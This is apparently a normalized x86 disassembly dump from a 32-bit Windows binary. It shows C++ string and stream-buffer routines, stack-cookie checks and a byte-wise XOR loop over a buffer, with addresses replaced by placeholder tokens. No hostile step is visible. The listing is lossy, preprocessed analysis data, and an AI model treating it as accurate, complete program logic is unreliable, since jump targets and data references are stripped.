lea ecx [ esi + 0x4 ]
mov edx ecx
mov edx [ esi + 0x4 ]
jmp r-xdata
push eax
push edx
lea eax [ ebp - 0x34 ]
call sub_1001d2fb
cmp eax 0xfffffff8
je r-xdata
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov eax [ esi + 0x14 ]
add edi edi
imul eax edi
push ebx
push eax
lea ecx [ ebp - 0x30 ]
call sub_1000957d
cmp [ esi + 0x18 ] 0x10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0x14 ]
jb r-xdata
cmp eax ebx
je r-xdata
push [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
push ebx
push eax
lea esi [ ebp - 0x54 ]
call sub_100095a1
mov ecx [ ebp - 0x38 ]
push 0xffffffff
push ebx
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10001f30
push ebx
push 0x1
mov ecx esi
call sub_10002020
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
call sub_100282ef
retn
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001c7f
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
call sub_10002075
push r--data
lea eax [ ebp - 0x7c ]
push eax
call sub_10027dd1
sub_10009332
push 0x28
mov eax sub_1004e90f
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov ebx ecx
push 0x0
lea ecx [ ebp - 0x2c ]
mov edi edx
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x14 ] 0xf
call sub_10002004
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10009256
pop ecx
push edi
mov edi [ ebp - 0x30 ]
lea ebx [ ebp - 0x2c ]
call sub_10009387
pop ecx
push 0x0
push 0x1
mov ecx ebx
call sub_10002020
call sub_100282ef
retn
sub_10009387
push 0x50
mov eax sub_1004e8e2
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax edi
call sub_100051c8
mov esi eax
lea eax [ ebp - 0x54 ]
push eax
mov ecx edi
call sub_10008a30
push [ esi + 0x4 ]
push [ esi ]
lea esi [ ebp - 0x48 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_1000c105
xor esi esi
mov [ ebp - 0x4 ] esi
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
call sub_10002004
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100090ff
mov edx [ ebp - 0x4c ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10009414
add esp 0xc
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10002020
call sub_100282ef
retn
sub_10009414
push 0x58
mov eax sub_1004d76a
call sub_10028203
mov ebx ecx
mov edi edx
mov esi [ ebp + 0x8 ]
mov eax [ ebx + 0x14 ]
mov [ ebp - 0x20 ] eax
test eax eax
ja r-xdata
mov eax [ esi + 0x14 ]
push 0x0
push eax
mov ecx edi
mov [ ebp - 0x1c ] eax
call sub_1000957d
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push r--data
lea ecx [ ebp - 0x3c ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10002075
push r--data
lea eax [ ebp - 0x64 ]
push eax
call sub_10027dd1
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add ebx 0x4
mov [ ebp - 0x18 ] ebx
mov edx [ ebx + 0x4 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
cmp [ ebx + 0x18 ] 0x10
mov [ ebp - 0x14 ] eax
jb r-xdata
call sub_100282db
retn
mov edi ecx
sub edi eax
jmp r-xdata
xor esi esi
cmp [ ebp - 0x1c ] esi
jbe r-xdata
lea ecx [ esi + eax ]
xor edx edx
mov eax esi
div [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov al [ edx + eax ]
xor al [ edi + ecx ]
inc esi
mov [ ecx ] al
cmp esi [ ebp - 0x1c ]
jb r-xdata
mov eax [ ebp - 0x14 ]
sub_100094d0
push 0x44
mov eax sub_1004d747
call sub_10028203
mov esi [ ebp + 0x8 ]
push edi
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_10001fc2
and [ ebp - 0x4 ] 0x0
mov al [ ebp + 0xc ]
mov [ esi + 0x20 ] al
cmp [ edi + 0x14 ] 0x0
ja r-xdata
mov eax esi
call sub_100282db
retn 0x8
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x1
call sub_10002075
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10027dd1
sub_1000957d
mov edx [ ecx + 0x14 ]
mov eax [ esp + 0x4 ]
cmp eax edx
ja r-xdata
push [ esp + 0x8 ]
sub eax edx
push eax
call sub_10007a24
push 0xffffffff
push eax
call sub_10001cd9
jmp r-xdata
retn 0x8
sub_100095a1
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10002004
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001f30
mov eax esi
leave
retn 0xc
sub_100095cf
push 0x10
mov eax sub_1004eff1
call sub_10028236
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_100053bb
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] bl
jne r-xdata
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x20 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp sub_10009656
mov [ ebp - 0x4 ] ebx
jmp sub_10009656
mov [ ebp - 0x14 ] 0x4
sub_10009626
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10003dcd
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10009656
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x1c ]
push eax
call sub_1000d05d
mov eax edi
call sub_100282db
retn 0xc
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
sub_10009682
push 0x8
mov eax sub_1004e8b7
call sub_10028203
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
xor ebx ebx
push edi
inc ebx
push esi
mov [ ebp - 0x10 ] ebx
call sub_10009da0
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_1000ae19
and [ edi + 0x3c ] 0x0
and [ edi + 0x40 ] 0x0
mov [ edi ] r--data
mov eax esi
call sub_100282db
retn 0x4
sub_100096ea
push 0x8
mov eax sub_1004e8b7
call sub_10028203
mov ebx ecx
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0xc ]
xor esi esi
push eax
inc esi
push edi
mov [ ebp - 0x10 ] esi
call sub_10009da0
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
lea esi [ edi + 0xc ]
push esi
mov [ edi + eax ] r--data
mov [ ebp - 0x14 ] esi
call sub_1000ae19
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
cmp [ ebx + 0x18 ] 0x10
mov eax [ ebx + 0x14 ]
jb r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
mov eax edi
call sub_100282db
retn 0x4
push ebx
mov ebx eax
call sub_1000ae65
and [ esi + 0x3c ] 0x0
and [ esi + 0x40 ] 0x0
test eax eax
je r-xdata
sub_1000977b
push 0x4
mov eax sub_1004cb4d
call sub_10028203
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_100097f4
mov ecx esi
call sub_100097c9
call sub_100282db
retn
sub_100097f4
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_1000ca57
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_100242e6
pop ecx
sub_1000983d
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx ]
test edi edi
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp edi edx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
pop edi
pop esi
leave
retn 0x4
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edi
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
mov [ ecx ] eax
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
jmp r-xdata
pop ebx
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov [ ecx ] al
test eax eax
jbe r-xdata
push 0x20
pop eax
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
jne r-xdata
mov ecx 0x7fffffff
sub ecx eax
cmp ecx ebx
jae r-xdata
add eax ebx
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_10001da6
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] edx
test ebx ebx
jbe r-xdata
test eax eax
shr eax 0x1
jne r-xdata
jne r-xdata
push ebx
push edx
push [ ebp - 0x4 ]
push edi
call sub_10001fe8
mov edx [ ebp - 0x8 ]
add esp 0x10
test ebx ebx
mov ecx [ esi + 0x14 ]
mov eax edi
sub eax edx
add [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x1 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
push edx
call sub_100242e6
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_100099da
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ esp + 0x4 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] dl
mov eax edx
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
retn 0x4
sub_10009a22
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
add ebx esi
cmp esi ebx
jae r-xdata
or eax 0xffffffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ edi ]
jmp r-xdata
or eax 0xffffffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_10009a7f
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_10009bb6
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_10009c9f
push esi
push edi
lea edi [ ecx - 0xc ]
lea esi [ edi + 0xc ]
mov ecx esi
call sub_100097c9
push esi
mov [ esi ] r--data
call sub_10023026
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_100242e6
pop ecx
sub_10009cec
push 0x10
mov eax sub_1004efcc
call sub_10028236
mov esi [ ebp + 0x8 ]
push 0x1
push esi
lea eax [ ebp - 0x1c ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
mov [ esi + 0x4 ] ebx
call sub_1000cfea
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x28 ]
mov eax [ ecx ]
push 0xffffffff
push [ ebp + 0xc ]
call [ eax + 0x1c ]
add [ esi + 0x4 ] eax
cmp eax [ ebp + 0x10 ]
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x1c ]
call sub_1000cb0a
mov eax esi
call sub_100282db
retn 0xc
push ebx
push [ ebp - 0x14 ]
call sub_100039ed
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x3
sub_10009d45
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_10003dcd
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10009da0
push 0x4
mov eax sub_1004e86d
call sub_10028203
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push esi
call sub_1000addd
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x8 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax esi
call sub_100282db
retn 0x8
sub_10009de0
push 0x40
mov eax sub_1004cff6
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] edi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0xf
call sub_10002004
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_10001fc2
lea ecx [ ebp - 0x48 ]
mov edx [ eax + 0x20 ]
cmp [ edx ] edi
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov ecx [ eax + 0x30 ]
mov ecx [ ecx ]
add ecx [ edx ]
mov eax [ eax + 0x10 ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_100026d3
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_100026d3
mov [ ebp - 0x4 ] edi
mov ecx edx
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10001fc2
lea ecx [ ebp - 0x2c ]
jmp r-xdata
push edi
push 0x1
call sub_10002020
mov eax ebx
call sub_100282ef
retn 0x4
sub_10009e96
push 0x50
mov eax sub_1004d70f
call sub_1002826c
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10003446
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000c26d
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10003c49
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
call sub_10002004
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_1000be24
mov [ ebp - 0x4 ] 0x3
call sub_1000be3b
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_100282ef
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_10001f30
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_10002020
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1000b6da
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1000bf88
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_1000b6da
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10009fe7
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ esp + 0x1c ]
mov ebx ecx
push eax
push ebx
call sub_1000b416
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ esp + 0x2c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1000b48a
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x18
sub_1000a060
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ esp + 0x1c ]
mov ebx ecx
push eax
push ebx
call sub_1000b416
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ esp + 0x2c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1000b48a
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x18
sub_1000a0d9
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push ebx
call sub_1000b416
add esp 0x10
push eax
lea eax [ esp + 0x24 ]
push 0x40
push eax
call sub_10024bfa
push eax
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1000b48a
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn 0x1c
sub_1000a155
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
